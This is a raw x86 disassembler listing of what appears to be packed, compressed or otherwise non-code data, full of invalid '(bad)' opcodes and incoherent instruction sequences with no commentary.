  429000:	pop    esp
  429001:	jmp    0xde0f:0x1aff1fb9
  429008:	cli    
  429009:	sub    BYTE PTR [ebx+0x68],bh
  42900c:	cmp    DWORD PTR ds:0x6b81d4,ebp
	...
  429072:	add    BYTE PTR [eax],al
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x21fc7b77
  429081:	adc    DWORD PTR [ebx+0x21],0x41
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0xf7000001,al
  42908d:	jbe    0x4290b6
  42908f:	jne    0x4290d1
  429091:	mov    dh,0x2a
  429093:	js     0x429101
  429095:	and    dl,ch
  429097:	inc    DWORD PTR [eax]
  429099:	xor    DWORD PTR [eax],0xffffff8e
  42909c:	sets   BYTE PTR [ebp-0x7fccda78]
  4290a3:	ins    DWORD PTR es:[edi],dx
  4290a4:	test   BYTE PTR [esi+0x5fb1dd63],0x24
  4290ab:	aas    
  4290ac:	test   ebp,0xce56ccf
  4290b2:	xchg   ecx,eax
  4290b3:	pop    esi
  4290b4:	sub    cl,dl
  4290b6:	retf   
  4290b7:	lods   al,BYTE PTR ds:[esi]
  4290b8:	ret    
  4290b9:	mov    cl,0x25
  4290bb:	xchg   esi,eax
  4290bc:	jne    0x4290cb
  4290be:	retf   
  4290bf:	push   edi
  4290c0:	push   es
  4290c1:	test   BYTE PTR [ecx],bh
  4290c3:	int3   
  4290c4:	and    dh,BYTE PTR [edi-0x69]
  4290c7:	or     bl,bh
  4290c9:	fwait
  4290ca:	mov    eax,ds:0xf6cc5b4
  4290cf:	loope  0x42907e
  4290d1:	and    eax,0xf2709c99
  4290d6:	xchg   ebx,eax
  4290d7:	rcl    DWORD PTR [esp+eax*1+0x4e],1
  4290db:	cmc    
  4290dc:	push   ss
  4290dd:	dec    edx
  4290de:	and    bx,WORD PTR [eax]
  4290e1:	loope  0x4290c5
  4290e3:	add    al,0xfa
  4290e5:	mov    esi,0xe496c224
  4290ea:	adc    edi,DWORD PTR [esi-0x9]
  4290ed:	fstp   QWORD PTR [eax]
  4290ef:	mov    ds:0x1a58f934,al
  4290f4:	adc    al,0x6a
  4290f6:	in     al,0x36
  4290f8:	jns    0x42910e
  4290fa:	and    BYTE PTR [ecx],0xd9
  4290fd:	push   es
  4290fe:	in     eax,0x31
  429100:	stc    
  429101:	sbb    BYTE PTR [ebp-0x512218fd],al
  429107:	add    BYTE PTR [edi+edx*4-0x76],dh
  42910b:	pop    edi
  42910c:	push   ss
  42910d:	loope  0x429168
  42910f:	(bad)  
  429110:	(bad)  
  429111:	sahf   
  429112:	lds    edx,FWORD PTR [edi]
  429114:	add    esp,DWORD PTR [ecx-0x52]
  429117:	pop    es
  429118:	je     0x4290b6
  42911a:	imul   edi,ecx,0x605c3317
  429120:	jae    0x42916f
  429122:	add    eax,0x6ef41b47
  429127:	push   ecx
  429128:	shl    edi,0x1e
  42912b:	in     al,0xec
  42912d:	(bad)  
  42912f:	pop    esi
  429130:	jb     0x429181
  429132:	sti    
  429133:	mov    esi,0x821c9089
  429138:	int3   
  429139:	aas    
  42913a:	shl    BYTE PTR [ebp+0xb3df069],cl
  429140:	fwait
  429141:	push   esp
  429142:	or     ebp,DWORD PTR [edi-0x6f]
  429145:	shl    DWORD PTR [ecx-0x71e13fb1],1
  42914b:	rol    BYTE PTR [eax+0x5a200f14],cl
  429151:	hlt    
  429152:	jbe    0x429157
  429154:	(bad)
  429157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429158:	fnsave [edx+0x40a072f3]
  42915e:	in     eax,dx
  42915f:	cli    
  429160:	addr16 mov eax,0xffb66a6d
  429166:	out    0x33,eax
  429168:	pop    ds
  429169:	(bad)  
  42916a:	cmp    eax,0xe500f7f
  42916f:	cmp    bh,BYTE PTR ds:0xea1d1565
  429175:	std    
  429176:	add    BYTE PTR [ecx],bl
  429178:	mov    ecx,0x8e54b128
  42917d:	push   ebp
  42917e:	mov    al,dh
  429180:	clc    
  429181:	adc    BYTE PTR [edi+ebp*2-0x1d],bl
  429185:	popa   
  429186:	and    DWORD PTR [ebx-0x4408a5d2],esi
  42918c:	fcomi  st,st(1)
  42918e:	(bad)  
  42918f:	cli    
  429190:	fiadd  DWORD PTR [eax]
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ecx+edi*8+0x4680fd81],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ecx],bh
  42920d:	xor    BYTE PTR [edx+eiz*8-0x60736b4a],bl
  429214:	ret    0xbc8f
  429217:	pop    esi
  429218:	mov    edi,DWORD PTR [edi-0x6]
  42921b:	daa    
  42921c:	clc    
  42921d:	sti    
  42921e:	jo     0x4291ae
  429220:	add    bh,bl
  429222:	xor    eax,0x6d569e5d
  429227:	mov    ebp,0x46ddcaa8
  42922c:	in     al,dx
  42922d:	push   edi
  42922e:	js     0x429216
  429230:	mov    esi,0x9bcecdf3
  429235:	push   es
  429236:	retf   0xd354
  429239:	imul   esp,ecx,0x279c2d5e
  42923f:	retf   
  429240:	push   edi
  429241:	pop    ecx
  429242:	push   edx
  429243:	adc    DWORD PTR [esi],edx
  429245:	loope  0x4291d8
  429247:	jg     0x429240
  429249:	pop    ecx
  42924a:	jl     0x429205
  42924c:	(bad)  
  42924d:	sahf   
  42924e:	in     eax,0xdd
  429250:	sti    
  429251:	popa   
  429252:	les    esi,FWORD PTR [ebx+edx*1]
  429255:	xchg   esp,eax
  429256:	sahf   
  429257:	popa   
  429258:	out    0x5d,al
  42925a:	pop    ecx
  42925b:	or     BYTE PTR ds:0x66b8e605,cl
  429261:	pushf  
  429262:	idiv   DWORD PTR [ebx-0x1f21a5bf]
  429268:	ja     0x4292d8
  42926a:	rcr    DWORD PTR [edi+edi*8+0x67c3848b],1
  429271:	sahf   
  429272:	(bad)  
  429273:	iret   
  429274:	xor    eax,0xffffffc9
  429277:	(bad)  
  429278:	cmp    al,0xaa
  42927a:	cmp    ebp,ecx
  42927c:	jae    0x4292a8
  42927e:	inc    esp
  42927f:	ffreep st(4)
  429281:	fadd   st,st(7)
  429283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429284:	lea    eax,[edx+0xd0c5161]
  42928a:	call   0x9399:0xf0b47e6f
  429291:	or     al,0xe8
  429293:	push   0xffffffb6
  429295:	dec    edx
  429296:	das    
  429297:	in     eax,0x45
  429299:	std    
  42929a:	push   ecx
  42929b:	dec    eax
  42929c:	in     al,dx
  42929d:	add    al,0xba
  42929f:	scas   al,BYTE PTR es:[edi]
  4292a0:	fwait
  4292a1:	push   edx
  4292a2:	fstp   DWORD PTR [ebx]
  4292a4:	out    0x2e,eax
  4292a6:	jp     0x429295
  4292a8:	sar    BYTE PTR ss:[esi-0x3030ab72],cl
  4292af:	xchg   esi,eax
  4292b0:	jnp    0x429252
  4292b2:	pop    ss
  4292b3:	lods   eax,DWORD PTR ds:[esi]
  4292b4:	mov    edx,0xcf5829c8
  4292b9:	inc    edx
  4292ba:	cmp    BYTE PTR [ebp-0x738fd2d6],ch
  4292c0:	loop   0x429282
  4292c2:	es in  al,0xc1
  4292c5:	jnp    0x429268
  4292c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292c8:	sbb    ch,dh
  4292ca:	mov    BYTE PTR [ebx],al
  4292cc:	and    ebp,0x4c565e56
  4292d2:	jne    0x429265
  4292d4:	xchg   esi,eax
  4292d5:	xor    eax,0xecee38d0
  4292da:	mov    ds:0x2d74f4b3,al
  4292df:	mov    ch,0x62
  4292e1:	call   0x7bd46200
  4292e6:	(bad)  
  4292e7:	push   ebp
  4292e8:	sbb    ebp,edi
  4292ea:	cli    
  4292eb:	sub    bh,0x60
  4292ee:	mov    dl,0x6a
  4292f0:	icebp  
  4292f1:	or     bh,BYTE PTR [esp+ebx*8-0x5e11c46c]
  4292f8:	nop
  4292f9:	ret    0x5aef
  4292fc:	xchg   esp,eax
  4292fd:	mov    al,0x7d
  4292ff:	mov    edx,0x221b8f2d
  429304:	sub    al,0x4d
  429306:	fidivr WORD PTR [ebp-0x1f]
  429309:	push   esi
  42930a:	mov    DWORD PTR [esi+0x6852e80a],ecx
  429310:	mov    eax,0x0
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xf8
  429381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429382:	(bad)  
  429383:	cmp    BYTE PTR [ebx-0x47],cl
  429386:	add    DWORD PTR [eax],eax
  429388:	add    eax,0xcb000001
  42938d:	push   esp
  42938e:	pop    ebx
  42938f:	push   edi
  429390:	ja     0x429329
  429392:	fnstenv ss:[ebx+edx*8+0x22ceef6]
  42939a:	(bad)  
  42939b:	lods   eax,DWORD PTR ds:[esi]
  42939c:	pop    ss
  42939d:	cdq    
  42939e:	mov    esp,0xb1dc2256
  4293a3:	icebp  
  4293a4:	xchg   ecx,eax
  4293a5:	sbb    al,0x46
  4293a7:	pop    ds
  4293a8:	loope  0x429405
  4293aa:	and    eax,DWORD PTR [eax-0x42]
  4293ad:	pop    esp
  4293ae:	sub    dl,al
  4293b0:	and    eax,0x4cd372c2
  4293b5:	and    ch,BYTE PTR [ecx+0x51]
  4293b8:	xchg   ebx,eax
  4293b9:	addr16 pop edi
  4293bb:	mov    cr3,edx
  4293be:	aas    
  4293bf:	dec    edx
  4293c0:	hlt    
  4293c1:	sub    eax,DWORD PTR [edx]
  4293c3:	jne    0x429429
  4293c5:	push   ebp
  4293c6:	ficom  WORD PTR [edi+0x47e7e3dd]
  4293cc:	fistp  QWORD PTR [edi]
  4293ce:	fsubr  QWORD PTR [ebx+0x5a]
  4293d1:	push   esp
  4293d2:	loope  0x42942f
  4293d4:	inc    edi
  4293d5:	or     dl,dh
  4293d7:	inc    eax
  4293d8:	rol    DWORD PTR [edx],0xfc
  4293db:	mov    ecx,DWORD PTR [edi+0x3e42fb81]
  4293e1:	jp     0x4293a8
  4293e3:	cmp    edi,ebx
  4293e5:	shr    bl,0xe5
  4293e8:	jge    0x4293f2
  4293ea:	icebp  
  4293eb:	out    dx,eax
  4293ec:	cmp    DWORD PTR [ebx],ebx
  4293ee:	(bad)  
  4293ef:	loop   0x429444
  4293f1:	mov    esi,0xff92046a
  4293f6:	mov    dh,0x22
  4293f8:	clc    
  4293f9:	mov    eax,ds:0xe6ea783f
  4293fe:	cmp    BYTE PTR [esi],ch
  429400:	cmp    al,0x99
  429402:	pop    ss
  429403:	cmp    edx,edi
  429405:	ffreep st(4)
  429407:	test   DWORD PTR [edi-0x6],ebx
  42940a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42940b:	dec    edx
  42940c:	(bad)  
  42940d:	xchg   esp,eax
  42940e:	leave  
  42940f:	fcom   QWORD PTR [edi-0x48]
  429412:	fdiv   QWORD PTR [edi]
  429414:	cli    
  429415:	push   es
  429416:	jae    0x4293e1
  429418:	stc    
  429419:	add    esp,DWORD PTR [esp+ecx*4+0x36]
  42941d:	inc    edi
  42941e:	xor    al,0x39
  429420:	sbb    dl,bl
  429422:	inc    ebp
  429423:	dec    edi
  429424:	in     al,0x9c
  429426:	pop    es
  429427:	cmp    al,0xc0
  429429:	cmp    edx,esi
  42942b:	pop    ecx
  42942c:	lea    esp,[ebp-0x32]
  42942f:	test   BYTE PTR [eax+0x440f9101],ch
  429435:	pop    esp
  429436:	mov    eax,ds:0x3540fffd
  42943b:	xlat   BYTE PTR ds:[ebx]
  42943c:	mov    esi,0x1b68acd3
  429441:	neg    BYTE PTR [edx]
  429443:	retf   0xed15
  429446:	int    0x18
  429448:	mov    edi,DWORD PTR [edi+0x22]
  42944b:	jmp    0x31c8:0x4d7d0aaa
  429452:	sar    DWORD PTR [ebx-0x5a],0x3
  429456:	add    DWORD PTR [eax+eiz*2+0x21],edi
  42945a:	and    esi,DWORD PTR [edi-0x4fe87ee9]
  429460:	cwde   
  429461:	sbb    BYTE PTR [eax-0x32],0x50
  429465:	jo     0x4294ab
  429467:	sti    
  429468:	hlt    
  429469:	inc    ecx
  42946a:	pushf  
  42946b:	shl    DWORD PTR [edx],cl
  42946d:	aam    0xf4
  42946f:	fsub   DWORD PTR [edx+0x4ad00f42]
  429475:	jae    0x429484
  429477:	outs   dx,BYTE PTR ds:[esi]
  429478:	push   ss
  429479:	add    DWORD PTR [ecx+0x13],0xffffffda
  42947d:	ja     0x4294fc
  42947f:	inc    ebx
  429480:	popf   
  429481:	pop    ebx
  429482:	and    BYTE PTR [edi],bl
  429484:	push   ss
  429485:	retf   
  429486:	test   al,0x22
  429488:	adc    BYTE PTR [esp+eiz*8-0x16cd76a7],0x57
  429490:	or     al,BYTE PTR [eax]
	...
  4294f2:	add    BYTE PTR [eax],al
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x2a4715ea],dx
  429503:	sbb    eax,0x1ba50
  429508:	add    eax,0xe7000001
  42950d:	or     eax,0xd0ad3ec
  429512:	out    0x23,al
  429514:	push   ebx
  429515:	mov    ch,0x5d
  429517:	fild   WORD PTR [ebp+ecx*4-0x11fd740a]
  42951e:	pop    esi
  42951f:	cmc    
  429520:	lock fistp DWORD PTR [edx+ebp*1-0x2b]
  429525:	fld    st(5)
  429527:	mov    ebx,0xa73cd0b
  42952c:	cmp    al,0x8f
  42952e:	mov    ebx,0x74737c7
  429533:	lds    edi,FWORD PTR [ecx+0x49]
  429536:	pop    edi
  429537:	and    al,ah
  429539:	adc    eax,0x1862b2f6
  42953e:	dec    ecx
  42953f:	pusha  
  429540:	addr16 push cs
  429542:	leave  
  429543:	addr16 sub edx,ebx
  429546:	mov    ds:0xb974e52e,eax
  42954b:	adc    BYTE PTR [edi+0x7d36a2c4],0x50
  429552:	inc    ebp
  429553:	and    ch,BYTE PTR [esi-0x76]
  429556:	or     al,0xc0
  429558:	enter  0x63b9,0x42
  42955c:	fidivr WORD PTR [esi+0x73]
  42955f:	in     al,0xfd
  429561:	jge    0x4295d0
  429563:	(bad)  
  429564:	sti    
  429565:	push   edi
  429566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429567:	xchg   BYTE PTR [edi],ch
  429569:	xlat   BYTE PTR ds:[ebx]
  42956a:	and    eax,esi
  42956c:	dec    esi
  42956d:	cmp    ecx,edi
  42956f:	outs   dx,BYTE PTR ds:[esi]
  429570:	shl    DWORD PTR [eax+0x75a90d42],0xbc
  429577:	xor    al,0x2c
  429579:	sub    BYTE PTR [ebx],0x9
  42957c:	vmwrite edi,DWORD PTR [ecx-0x47463788]
  429583:	cmp    edx,ebx
  429585:	fimul  WORD PTR [esi+ebx*1]
  429588:	les    edx,FWORD PTR [ecx]
  42958a:	cmp    ebx,eax
  42958c:	fdivr  QWORD PTR [ebx+esi*2-0x6c]
  429590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429591:	cld    
  429592:	xor    DWORD PTR [eax-0x45dfe388],esp
  429598:	sub    DWORD PTR [eax-0x1],ebp
  42959b:	mov    ecx,0x29a6cd19
  4295a0:	mov    al,0xa5
  4295a2:	jmp    0x4b7159b9
  4295a7:	add    BYTE PTR cs:[ecx-0x76],cl
  4295ab:	fld    st(2)
  4295ad:	test   DWORD PTR [ebx+0x31ae96d5],ecx
  4295b3:	inc    edx
  4295b4:	mov    al,ds:0x281bd40a
  4295b9:	lahf   
  4295ba:	sbb    esp,DWORD PTR [edi]
  4295bc:	pop    ebp
  4295bd:	mov    ecx,DWORD PTR [ebx]
  4295bf:	xor    eax,0x37c7fc94
  4295c4:	xchg   ecx,eax
  4295c5:	dec    esp
  4295c6:	data16 jp 0x42959d
  4295c9:	inc    edi
  4295ca:	sub    eax,0x2fe94666
  4295cf:	xchg   ebp,eax
  4295d0:	call   0xcd3f:0xba4b091a
  4295d7:	jns    0x4295e3
  4295d9:	cwde   
  4295da:	out    0xde,eax
  4295dc:	dec    edi
  4295dd:	stc    
  4295de:	cli    
  4295df:	loopne 0x429592
  4295e1:	loop   0x4295b7
  4295e3:	cli    
  4295e4:	arpl   dx,bx
  4295e6:	and    al,0xdc
  4295e8:	jns    0x4295f4
  4295ea:	jl     0x42958b
  4295ec:	ins    DWORD PTR es:[edi],dx
  4295ed:	xor    ebp,esp
  4295ef:	aaa    
  4295f0:	sbb    al,0x84
  4295f2:	aad    0x8c
  4295f4:	out    0xdf,eax
  4295f6:	jecxz  0x429621
  4295f8:	dec    edx
  4295f9:	dec    ebx
  4295fa:	jbe    0x4295f2
  4295fc:	dec    ecx
  4295fd:	(bad)  
  4295fe:	out    0x70,al
  429600:	mov    BYTE PTR [edx-0xf6d64a5],ch
  429606:	sbb    eax,0xe4bd8a95
  42960b:	cmp    BYTE PTR [edi-0x3],dl
  42960e:	test   al,0x37
  429610:	mov    ecx,0x0
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	nop
  429681:	in     al,dx
  429682:	adc    dh,cl
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	outs   dx,BYTE PTR ds:[esi]
  42968d:	mov    DWORD PTR [ecx],eax
  42968f:	stos   BYTE PTR es:[edi],al
  429690:	jnp    0x42961d
  429692:	loop   0x429652
  429694:	cli    
  429695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429696:	jle    0x429697
  429698:	imul   eax,DWORD PTR [eax-0xc67b09],0x70
  42969f:	add    ebx,DWORD PTR [edi]
  4296a1:	xor    al,ch
  4296a3:	pop    edx
  4296a4:	adc    DWORD PTR [edx-0x3329dec6],esp
  4296aa:	add    ax,0x6304
  4296ae:	pop    esi
  4296af:	mov    ch,0xbe
  4296b1:	mov    edi,eax
  4296b3:	push   cs
  4296b4:	pop    ebx
  4296b5:	sub    DWORD PTR [esi],edx
  4296b7:	and    BYTE PTR [esi+0x47d6cf76],0x69
  4296be:	inc    edx
  4296bf:	stos   DWORD PTR es:[edi],eax
  4296c0:	mov    ds:0x202593bd,eax
  4296c5:	mov    eax,eax
  4296c7:	cwde   
  4296c8:	mov    ebp,0x2e72a281
  4296cd:	add    BYTE PTR [eax+eiz*1],bh
  4296d0:	clc    
  4296d1:	inc    ebp
  4296d2:	xor    dl,dh
  4296d4:	lods   al,BYTE PTR ds:[esi]
  4296d5:	daa    
  4296d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296d7:	aam    0xb2
  4296d9:	cdq    
  4296da:	lods   al,BYTE PTR ds:[esi]
  4296db:	sbb    esp,ecx
  4296dd:	popa   
  4296de:	outs   dx,BYTE PTR ds:[esi]
  4296df:	sahf   
  4296e0:	daa    
  4296e1:	push   edi
  4296e2:	push   esp
  4296e3:	jnp    0x429722
  4296e5:	xchg   esp,eax
  4296e6:	pop    ss
  4296e7:	test   edx,esp
  4296e9:	inc    eax
  4296ea:	lock push edx
  4296ec:	inc    ebp
  4296ed:	pop    es
  4296ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296ef:	in     al,dx
  4296f0:	dec    eax
  4296f1:	pusha  
  4296f2:	data16 mov dh,0xb2
  4296f5:	lock or eax,0x829ea60a
  4296fb:	xchg   esp,eax
  4296fc:	mov    cl,BYTE PTR ds:0xf2ada603
  429702:	pop    esi
  429703:	out    0x2c,al
  429705:	push   ebp
  429706:	xlat   BYTE PTR ds:[ebx]
  429707:	or     eax,0x1c79a3dd
  42970c:	pop    esi
  42970d:	xchg   ebp,eax
  42970e:	retf   0x8707
  429711:	push   eax
  429712:	push   edi
  429713:	dec    ecx
  429714:	push   ss
  429715:	jno    0x429714
  429717:	inc    ebp
  429718:	dec    ebp
  429719:	pusha  
  42971a:	jge    0x4296be
  42971c:	push   esi
  42971d:	aad    0x6e
  42971f:	lods   al,BYTE PTR ds:[esi]
  429720:	iret   
  429721:	(bad)  
  429722:	rcl    BYTE PTR [ebp+0x503e93a],cl
  429728:	nop
  429729:	mov    al,0x30
  42972b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42972c:	(bad)  
  42972d:	test   eax,0xc15bf104
  429732:	cs pop eax
  429734:	leave  
  429735:	sahf   
  429736:	sbb    al,0xd5
  429738:	out    0x52,al
  42973a:	rcl    BYTE PTR [ebp+0x40],cl
  42973d:	add    al,0x30
  42973f:	jmp    0xb8961e55
  429744:	or     ecx,0xffffff84
  429747:	dec    edi
  429748:	jg     0x429742
  42974a:	cmp    al,0x3b
  42974c:	xchg   esp,eax
  42974d:	adc    bh,ch
  42974f:	sbb    ebp,ecx
  429751:	retf   0x5027
  429754:	outs   dx,BYTE PTR ds:[esi]
  429755:	mov    ebp,0x93a9d3af
  42975a:	adc    eax,0x92091b45
  42975f:	mov    edx,0x3ebbce65
  429764:	int3   
  429765:	xchg   esp,eax
  429766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429767:	xchg   DWORD PTR [eax],esi
  429769:	iret   
  42976a:	adc    ah,dl
  42976c:	push   ebp
  42976d:	cmp    dl,0x81
  429770:	mov    WORD PTR gs:[eax],ds
  429773:	cld    
  429774:	add    esi,ecx
  429776:	jbe    0x42976f
  429778:	pop    edx
  429779:	mov    BYTE PTR [ebp-0x7fbf5b73],0xd7
  429780:	pop    esp
  429781:	retf   0xcd71
  429784:	imul   ecx,DWORD PTR [esi],0x9d0fc9b1
  42978a:	stos   BYTE PTR es:[edi],al
  42978b:	iret   
  42978c:	sub    ebp,ecx
  42978e:	sti    
  42978f:	sbb    dh,0x0
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	jo     0x4297fb
  429802:	mov    DWORD PTR [edx+ebx*2+0x50001bc],ecx
  429809:	add    DWORD PTR [eax],eax
  42980b:	add    BYTE PTR [ecx],dh
  42980d:	sbb    esi,DWORD PTR [ecx+0x4f3a49c7]
  429813:	sub    eax,0xb5dfa942
  429818:	out    0x24,eax
  42981a:	outs   dx,DWORD PTR ds:[esi]
  42981b:	push   cs
  42981c:	mov    edi,0xf90652ce
  429821:	sti    
  429822:	sub    al,0xbd
  429824:	cmp    BYTE PTR [eax],ah
  429826:	ss xchg ebx,eax
  429828:	shl    DWORD PTR [eax-0x10],0x24
  42982c:	push   ebp
  42982d:	mov    ?,WORD PTR [ecx-0x59]
  429830:	repnz int 0xeb
  429833:	add    al,0x9
  429835:	sub    al,0x83
  429837:	(bad)
  42983b:	inc    ecx
  42983c:	(bad)  
  42983d:	mov    al,0x4c
  42983f:	add    eax,0x228c4197
  429844:	xchg   ebx,eax
  429845:	jb     0x429826
  429847:	test   al,0x9
  429849:	es lock push esp
  42984c:	mov    ds:0x7dabf43,al
  429851:	jb     0x429868
  429853:	imul   ebx,DWORD PTR [ecx+0x2a],0x254f8d09
  42985a:	sub    ah,cl
  42985c:	dec    ebp
  42985d:	div    BYTE PTR [edi-0x51]
  429860:	xor    al,0x92
  429862:	mov    bl,0x4
  429864:	push   ecx
  429865:	xchg   ebp,eax
  429866:	cdq    
  429867:	cmp    al,0xb0
  429869:	(bad)  [ecx-0x56]
  42986c:	scas   eax,DWORD PTR es:[edi]
  42986d:	ins    BYTE PTR es:[edi],dx
  42986e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42986f:	sahf   
  429870:	mov    bl,0xf4
  429872:	sbb    eax,0x5ca0d8fd
  429877:	jae    0x4298d0
  429879:	mov    DWORD PTR [ecx+ebp*1-0x67],eax
  42987d:	pushf  
  42987e:	fist   DWORD PTR [eax+0xa62bc4a]
  429884:	dec    esi
  429885:	jo     0x429809
  429887:	ret    0xb4b9
  42988a:	repnz adc eax,0x8ede204d
  429890:	mov    esi,0xbb9f9634
  429895:	add    DWORD PTR [edi],esi
  429897:	or     eax,0x397e0709
  42989c:	jbe    0x42989c
  42989e:	add    dh,BYTE PTR [ebx-0x39]
  4298a1:	cmp    cl,BYTE PTR [eax]
  4298a3:	dec    ebp
  4298a4:	dec    ecx
  4298a5:	sahf   
  4298a6:	xchg   edi,eax
  4298a7:	push   esi
  4298a8:	adc    al,0xb1
  4298aa:	retf   0xffc1
  4298ad:	jnp    0x429868
  4298af:	fldln2 
  4298b1:	pop    ebx
  4298b2:	sub    BYTE PTR [ecx-0x5cfbe817],al
  4298b8:	out    0x87,eax
  4298ba:	xchg   esi,eax
  4298bb:	iret   
  4298bc:	xlat   BYTE PTR ds:[ebx]
  4298bd:	and    ah,cl
  4298bf:	push   cs
  4298c0:	cmp    BYTE PTR [edi],dh
  4298c2:	in     al,0x94
  4298c4:	rol    DWORD PTR [esi+0x6b],0xf0
  4298c8:	sub    BYTE PTR [esi-0x2f],cl
  4298cb:	sbb    DWORD PTR [eax+0x2a779c78],0x4241d272
  4298d5:	bnd jmp 0xd97fe3d7
  4298db:	sbb    DWORD PTR [ebp+0x30467041],ecx
  4298e1:	adc    al,0x6e
  4298e3:	jns    0x42991d
  4298e5:	adc    eax,0xc7d6780a
  4298ea:	mov    ecx,0x2d49adf4
  4298ef:	sti    
  4298f0:	enter  0x64a8,0xc9
  4298f4:	or     al,0x9f
  4298f6:	lods   al,BYTE PTR ds:[esi]
  4298f7:	cmp    ebp,DWORD PTR [edx-0x2b]
  4298fa:	(bad)  
  4298fb:	mov    ds:0x1519a610,al
  429900:	mov    cl,0xf3
  429902:	mov    ecx,0x5bd7ddcf
  429907:	xchg   edx,eax
  429908:	xchg   BYTE PTR [edx-0x11a963f4],dl
  42990e:	test   al,0xc7
  429910:	outs   dx,DWORD PTR ds:[esi]
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	ja     0x42998d
  429982:	into   
  429983:	and    BYTE PTR [edi-0x43],bl
  429986:	add    DWORD PTR [eax],eax
  429988:	add    eax,0x7e000001
  42998d:	jecxz  0x42998e
  42998f:	test   eax,0xa7f87ef3
  429994:	jle    0x42993a
  429996:	test   al,0x8f
  429998:	cs out dx,al
  42999a:	fdivr  QWORD PTR [eax]
  42999c:	fimul  DWORD PTR [edi]
  42999e:	mov    ds:0x5a7bae2,al
  4299a3:	pop    ebp
  4299a4:	sbb    dl,BYTE PTR [edx]
  4299a6:	mov    al,ds:0x30dcba2c
  4299ab:	jmp    0xea9f:0x2a3d7db1
  4299b2:	call   DWORD PTR [edi+0x6e]
  4299b5:	sbb    BYTE PTR [ebx+0x374a6a6d],dh
  4299bb:	shl    al,0xaa
  4299be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299bf:	xchg   esi,eax
  4299c0:	xchg   ebx,eax
  4299c1:	xor    BYTE PTR [eax],al
  4299c3:	fcmovnbe st,st(0)
  4299c5:	int3   
  4299c6:	lock mov DWORD PTR [edx-0x5d],esi
  4299ca:	sub    eax,0xf82c95ae
  4299cf:	retf   0x3d8a
  4299d2:	jge    0x429970
  4299d4:	or     dh,BYTE PTR [eax+esi*8-0x7c302877]
  4299db:	jl     0x429a2d
  4299dd:	imul   ebp,esi,0x4b
  4299e0:	ss test al,0x43
  4299e3:	les    edx,FWORD PTR [edx]
  4299e5:	cdq    
  4299e6:	mov    eax,ds:0x223cf48e
  4299eb:	adc    ah,BYTE PTR [edi-0x2c]
  4299ee:	scas   eax,DWORD PTR es:[edi]
  4299ef:	sub    DWORD PTR [ecx-0x4a3a82b7],esi
  4299f5:	ror    DWORD PTR [edx],cl
  4299f7:	or     esi,DWORD PTR [ecx+0x24]
  4299fa:	pop    ebx
  4299fb:	mov    esi,0x324c6908
  429a00:	pop    esi
  429a01:	and    DWORD PTR [edi],edi
  429a03:	add    eax,0x1f6e86b3
  429a08:	mov    ecx,DWORD PTR ss:[ebx+ecx*8-0x35]
  429a0d:	lods   al,BYTE PTR ds:[esi]
  429a0e:	and    edi,DWORD PTR [ecx-0x106f3bdb]
  429a14:	pop    edi
  429a15:	stos   BYTE PTR es:[edi],al
  429a16:	addr16 mov ds:0xb62a,eax
  429a1a:	in     al,0x4
  429a1c:	sub    dh,BYTE PTR [ebx-0x1215239]
  429a22:	ror    DWORD PTR [eax],cl
  429a24:	ss test al,0xa3
  429a27:	popf   
  429a28:	out    0x5,al
  429a2a:	fyl2x  
  429a2c:	out    dx,al
  429a2d:	(bad)  
  429a2e:	out    dx,eax
  429a2f:	mov    esp,0x9f30bdc0
  429a34:	push   edx
  429a35:	hlt    
  429a36:	lods   al,BYTE PTR ds:[esi]
  429a37:	popa   
  429a38:	in     al,0x91
  429a3a:	arpl   di,sp
  429a3c:	imul   esi,DWORD PTR [edi-0x10b8fb37],0x7e
  429a43:	arpl   di,bp
  429a45:	mov    al,ds:0x98ee5895
  429a4a:	jmp    0x13df2a31
  429a4f:	imul   ebx,ebp,0x51c26d42
  429a55:	popf   
  429a56:	cmp    edi,DWORD PTR [ecx-0x1d]
